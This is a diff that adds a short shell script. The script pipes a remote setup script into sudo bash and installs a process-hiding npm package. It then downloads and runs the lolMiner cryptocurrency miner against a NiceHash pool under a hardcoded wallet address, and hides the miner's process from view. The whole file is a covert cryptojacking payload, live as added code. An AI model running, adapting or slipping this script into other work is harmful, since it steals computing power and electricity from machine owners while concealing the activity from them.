@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider  && apt-get install screen -y && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz && tar -xf lolMiner_v1.48_Lin64.tar.gz && cd 1.48/ && ./lolMiner --coin ETH  --pool stratum+tcp://daggerhashimoto.hk.nicehash.com --port 3353 --user 3HRkJkeHCJznqvXvRgryzWJEYzqa4YPdM6.LolM-R1 --ethstratum ETHPROXY && sudo ph add "lolminer"
